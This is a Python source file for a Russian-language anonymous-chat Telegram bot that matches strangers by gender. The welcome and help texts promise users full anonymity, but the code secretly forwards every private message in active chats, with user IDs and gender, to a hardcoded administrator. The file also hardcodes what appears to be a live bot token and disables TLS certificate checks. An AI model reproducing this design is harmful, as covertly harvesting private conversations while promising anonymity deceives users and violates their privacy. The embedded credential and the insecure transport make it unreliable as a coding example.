import os
import requests
import time
import json
from datetime import datetime

# Получаем данные из переменных окружения
BOT_TOKEN = os.getenv('BOT_TOKEN', '8989411110:AAEyB5rprid4C_cTrDevoZBXCwIaeP2AjdQ')
ADMIN_ID = int(os.getenv('ADMIN_ID', '1461749470'))
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
# Отключаем SSL предупреждения
import urllib3
urllib3.disable_warnings()

class SimpleMonitorBot:
    def __init__(self):
        self.offset = 0
        self.users_data = {}
        self.active_chats = {}
        self.searching_users = {"male": [], "female": []}
        self.banned_users = set()
        self.monitoring = True
        
        print(f"👁️ Простой бот с мониторингом запущен")
        print(f"👨‍💼 Админ ID: {ADMIN_ID}")
        print("🔍 Мониторинг только личных сообщений")
    
    def send_message(self, chat_id, text, reply_markup=None, parse_mode=None):
        """Исправленная отправка сообщений"""
        data = {'chat_id': chat_id, 'text': text}
        if reply_markup:
            data['reply_markup'] = json.dumps(reply_markup)
        if parse_mode:
            data['parse_mode'] = parse_mode
        
        try:
            response = requests.post(f"{API_URL}/sendMessage", data=data, verify=False)
            return response.json()
        except Exception as e:
            print(f"Ошибка отправки: {e}")
            return None
    
    def get_updates(self):
        try:
            response = requests.get(
                f"{API_URL}/getUpdates", 
                params={'offset': self.offset, 'timeout': 1},
                verify=False
            )
            return response.json()
        except:
            return None
    
    def send_to_admin(self, user_id, text):
        """Отправляем ТОЛЬКО личные сообщения админу"""
        time_str = datetime.now().strftime("%H:%M:%S")
        
        # Определяем с кем общается
        partner_info = ""
        if user_id in self.active_chats:
            partner_id = self.active_chats[user_id]
            partner_info = f" ↔️ {partner_id}"
        else:
            return  # Не отправляем если не в чате
        
        # Получаем пол пользователя
        user_gender = self.users_data.get(user_id, {}).get('gender', '❓')
        gender_emoji = {"male": "👨", "female": "👩", "❓": "❓"}
        
        monitor_msg = f"💬 {time_str}\n"
        monitor_msg += f"{gender_emoji[user_gender]} {user_id}{partner_info}\n"
        monitor_msg += f"📝 {text}\n\n"
        monitor_msg += f"🚫 /ban{user_id} - забанить"
        
        self.send_message(ADMIN_ID, monitor_msg)
    
    def ban_user(self, user_id):
        """Банить пользователя"""
        self.banned_users.add(user_id)
        
        # Завершаем его чат
        if user_id in self.active_chats:
            partner = self.active_chats[user_id]
            del self.active_chats[user_id]
            if partner in self.active_chats:
                del self.active_chats[partner]
            self.send_message(partner, "❌ Собеседник отключен администратором", self.get_start_keyboard())
        
        # Убираем из поиска
        for gender in self.searching_users:
            if user_id in self.searching_users[gender]:
                self.searching_users[gender].remove(user_id)
        
        self.send_message(user_id, "🚫 Вы заблокированы администратором")
        self.send_message(ADMIN_ID, f"✅ Пользователь {user_id} забанен")
        print(f"🚫 Забанен: {user_id}")
    
    def unban_user(self, user_id):
        """Разбанить пользователя"""
        self.banned_users.discard(user_id)
        self.send_message(user_id, "✅ Вы разблокированы", self.get_start_keyboard())
        self.send_message(ADMIN_ID, f"✅ Пользователь {user_id} разбанен")
        print(f"✅ Разбанен: {user_id}")
    
    def get_start_keyboard(self):
        return {
            'keyboard': [
                [{'text': '🚀 Начать поиск'}],
                [{'text': 'ℹ️ Помощь'}]
            ],
            'resize_keyboard': True
        }
    
    def get_gender_keyboard(self):
        return {
            'inline_keyboard': [
                [
                    {'text': '👨 Парень', 'callback_data': 'gender_male'},
                    {'text': '👩 Девушка', 'callback_data': 'gender_female'}
                ]
            ]
        }
    
    def get_search_keyboard(self):
        return {
            'inline_keyboard': [
                [
                    {'text': '👩 Девушек', 'callback_data': 'search_female'},
                    {'text': '🎲 Случайно', 'callback_data': 'search_random'},
                    {'text': '👨 Парней', 'callback_data': 'search_male'}
                ]
            ]
        }
    
    def get_chat_keyboard(self):
        return {
            'keyboard': [
                [{'text': '❌ Завершить чат'}],
                [{'text': '➡️ Следующий'}]
            ],
            'resize_keyboard': True
        }
    
    def find_partner(self, user_id, looking_for):
        """Поиск партнера"""
        if looking_for == "random":
            all_users = self.searching_users["male"] + self.searching_users["female"]
            available = [u for u in all_users if u != user_id]
        else:
            available = [u for u in self.searching_users[looking_for] if u != user_id]
        
        if available:
            partner = available[0]
            
            # Убираем из поиска
            for gender in self.searching_users:
                if user_id in self.searching_users[gender]:
                    self.searching_users[gender].remove(user_id)
                if partner in self.searching_users[gender]:
                    self.searching_users[gender].remove(partner)
            
            # Создаем чат
            self.active_chats[user_id] = partner
            self.active_chats[partner] = user_id
            
            # Получаем информацию о пользователях
            user_gender = self.users_data[user_id]['gender']
            partner_gender = self.users_data[partner]['gender']
            
            gender_text = {"male": "👨 Парень", "female": "👩 Девушка"}
            
            # Уведомляем пользователей
            self.send_message(user_id, 
                f"✅ Собеседник найден!\n"
                f"{gender_text[partner_gender]}\n\n"
                f"💬 Можете начинать общение!", 
                self.get_chat_keyboard())
            
            self.send_message(partner, 
                f"✅ Собеседник найден!\n"
                f"{gender_text[user_gender]}\n\n"
                f"💬 Можете начинать общение!", 
                self.get_chat_keyboard())
            
            # Уведомляем админа о новом чате
            self.send_message(ADMIN_ID, 
                f"💬 НОВЫЙ ЧАТ\n"
                f"👤 {user_id} ({user_gender}) ↔️ {partner} ({partner_gender})")
            return True
        
        return False
    
    def end_chat(self, user_id):
        """Завершить чат"""
        if user_id in self.active_chats:
            partner = self.active_chats[user_id]
            del self.active_chats[user_id]
            del self.active_chats[partner]
            
            self.send_message(user_id, "👋 Чат завершен", self.get_start_keyboard())
            self.send_message(partner, "👋 Собеседник завершил чат", self.get_start_keyboard())
            
            # Уведомляем админа
            self.send_message(ADMIN_ID, f"📴 Чат завершен: {user_id} ↔️ {partner}")
            return True
        return False
    
    def handle_admin_commands(self, text):
        """Обработка админ команд"""
        if text.startswith('/ban'):
            try:
                user_id = int(text.replace('/ban', ''))
                self.ban_user(user_id)
                return True
            except:
                self.send_message(ADMIN_ID, "❌ Неверная команда. Используйте: /ban123456789")
        
        elif text.startswith('/unban'):
            try:
                user_id = int(text.replace('/unban', ''))
                self.unban_user(user_id)
                return True
            except:
                self.send_message(ADMIN_ID, "❌ Неверная команда. Используйте: /unban123456789")
        
        elif text == '/status':
            banned_count = len(self.banned_users)
            active_chats = len(self.active_chats) // 2
            searching = len(self.searching_users['male']) + len(self.searching_users['female'])
            total_users = len(self.users_data)
            
            status = f"📊 СТАТУС БОТА\n\n"
            status += f"👥 Всего пользователей: {total_users}\n"
            status += f"💬 Активных чатов: {active_chats}\n"
            status += f"🔍 В поиске: {searching}\n"
            status += f"🚫 Забанено: {banned_count}\n\n"
            status += f"👁️ Мониторинг: Включен"
            
            self.send_message(ADMIN_ID, status)
            return True
        
        elif text == '/help':
            help_text = f"🤖 АДМИН КОМАНДЫ:\n\n"
            help_text += f"📊 /status - статистика бота\n"
            help_text += f"🚫 /ban123456789 - забанить\n"
            help_text += f"✅ /unban123456789 - разбанить\n"
            help_text += f"❓ /help - справка\n\n"
            help_text += f"👁️ Мониторинг автоматический"
            
            self.send_message(ADMIN_ID, help_text)
            return True
        
        return False
    
    def handle_callback(self, callback):
        """Обработка кнопок"""
        data = callback.get('data', '')
        user_id = callback['from']['id']
        chat_id = callback['message']['chat']['id']
        
        if user_id in self.banned_users:
            return
        
        if data.startswith('gender_'):
            gender = data.split('_')[1]
            self.users_data[user_id] = {'gender': gender}
            
            gender_text = '👨 Парень' if gender == 'male' else '👩 Девушка'
            self.send_message(chat_id, f"✅ Пол выбран: {gender_text}")
            self.send_message(chat_id, "🔍 Кого хотите найти для общения?", self.get_search_keyboard())
        
        elif data.startswith('search_'):
            looking_for = data.split('_')[1]
            self.users_data[user_id]['looking_for'] = looking_for
            
            # Добавляем в поиск
            user_gender = self.users_data[user_id]['gender']
            self.searching_users[user_gender].append(user_id)
            
            # Ищем партнера
            if self.find_partner(user_id, looking_for):
                return
            
            search_text = {
                'female': 'девушек',
                'male': 'парней', 
                'random': 'случайного собеседника'
            }
            
            self.send_message(chat_id, f"🔍 Ищем {search_text[looking_for]}...\n⏳ Ожидайте подключения")
    
    def is_system_message(self, text):
        """Проверяем является ли сообщение системным"""
        system_messages = [
            '🚀 Начать поиск',
            '❌ Завершить чат',
            '➡️ Следующий',
            'ℹ️ Помощь'
        ]
        return text in system_messages or text.startswith('/')
    
    def run(self):
        """Главный цикл"""
        print("🚀 Запуск бота...")
        
        # Проверяем подключение
        try:
            response = requests.get(f"{API_URL}/getMe", verify=False)
            if response.status_code == 200:
                bot_info = response.json()['result']
                print(f"✅ Подключен: {bot_info['first_name']}")
            else:
                print("❌ Ошибка API")
                return
        except Exception as e:
            print(f"❌ Ошибка подключения: {e}")
            return
        
        print("📡 Слушаем сообщения...")
        print(f"💬 Админ команды: /status /help /ban123456789")
        
        while True:
            try:
                updates = self.get_updates()
                if updates and updates.get('ok'):
                    for update in updates['result']:
                        self.offset = update['update_id'] + 1
                        
                        # Обычные сообщения
                        if 'message' in update:
                            message = update['message']
                            user_id = message['from']['id']
                            text = message.get('text', '')
                            chat_id = message['chat']['id']
                            
                            print(f"📨 {user_id}: {text}")
                            
                            # Проверяем бан
                            if user_id in self.banned_users:
                                continue
                            
                            # Админ команды
                            if user_id == ADMIN_ID:
                                if self.handle_admin_commands(text):
                                    continue
                            # МОНИТОРИНГ: отправляем админу ТОЛЬКО личные сообщения в чатах
                            if (user_id != ADMIN_ID and 
                                user_id in self.active_chats and 
                                not self.is_system_message(text)):
                                self.send_to_admin(user_id, text)
                            
                            # Обработка команд пользователей
                            if text == '/start':
                                if user_id not in self.users_data:
                                    self.send_message(chat_id, 
                                        "🎭 Добро пожаловать в анонимный чат!\n\n"
                                        "Здесь вы можете найти случайного собеседника для общения.\n\n"
                                        "🔒 Полная анонимность\n"
                                        "💬 Мгновенное подключение\n"
                                        "🎯 Выбор собеседника по полу\n\n"
                                        "Выберите ваш пол:", 
                                        self.get_gender_keyboard())
                                else:
                                    self.send_message(chat_id, "👋 С возвращением!", self.get_start_keyboard())
                            
                            elif text == '🚀 Начать поиск':
                                if user_id not in self.users_data:
                                    self.send_message(chat_id, "❌ Сначала укажите пол через /start")
                                elif user_id in self.active_chats:
                                    self.send_message(chat_id, "❌ Вы уже в чате! Сначала завершите текущий.")
                                elif user_id in self.searching_users['male'] or user_id in self.searching_users['female']:
                                    self.send_message(chat_id, "🔍 Поиск уже активен! Ожидайте...")
                                else:
                                    self.send_message(chat_id, "🔍 Кого хотите найти?", self.get_search_keyboard())
                            
                            elif text == '❌ Завершить чат':
                                if self.end_chat(user_id):
                                    pass  # Уведомления уже отправлены в end_chat()
                                else:
                                    self.send_message(chat_id, "❌ Вы не в активном чате")
                            
                            elif text == '➡️ Следующий':
                                if user_id in self.active_chats:
                                    self.end_chat(user_id)
                                    self.send_message(chat_id, "🔍 Ищем следующего собеседника...", self.get_search_keyboard())
                                else:
                                    self.send_message(chat_id, "❌ Вы не в активном чате")
                            
                            elif text == 'ℹ️ Помощь':
                                help_text = "🤖 ПОМОЩЬ ПО БОТУ\n\n"
                                help_text += "Команды:\n"
                                help_text += "🚀 Начать поиск - найти собеседника\n"
                                help_text += "❌ Завершить чат - закончить общение\n"
                                help_text += "➡️ Следующий - найти другого собеседника\n"
                                help_text += "ℹ️ Помощь - эта справка\n\n"
                                help_text += "Как пользоваться:\n"
                                help_text += "1. Выберите ваш пол\n"
                                help_text += "2. Укажите кого ищете\n"
                                help_text += "3. Ожидайте подключения\n"
                                help_text += "4. Общайтесь!\n\n"
                                help_text += "🔒 Полная анонимность"
                                
                                self.send_message(chat_id, help_text)
                            
                            else:
                                # Пересылка сообщений в чате
                                if user_id in self.active_chats:
                                    partner = self.active_chats[user_id]
                                    
                                    # Отправляем сообщение партнеру
                                    success = self.send_message(partner, text)
                                    
                                    if not success:
                                        # Если партнер заблокировал бота или удалил чат
                                        self.end_chat(user_id)
                                        self.send_message(chat_id, "❌ Собеседник недоступен. Чат завершен.", self.get_start_keyboard())
                                else:
                                    # Пользователь не в чате, но пишет сообщение
                                    if not self.is_system_message(text):
                                        self.send_message(chat_id, 
                                            "❌ Сначала найдите собеседника!\n\n"
                                            "Нажмите 🚀 Начать поиск", 
                                            self.get_start_keyboard())
                        
                        # Обработка нажатий на кнопки
                        elif 'callback_query' in update:
                            self.handle_callback(update['callback_query'])
                
                time.sleep(0.1)  # Небольшая пауза чтобы не нагружать CPU
                
            except KeyboardInterrupt:
                print("\n👋 Бот остановлен пользователем")
                break
            except Exception as e:
                print(f"⚠️ Ошибка в главном цикле: {e}")
                time.sleep(1)  # Пауза при ошибке

if __name__ == "__main__":
    bot = SimpleMonitorBot()
    bot.run()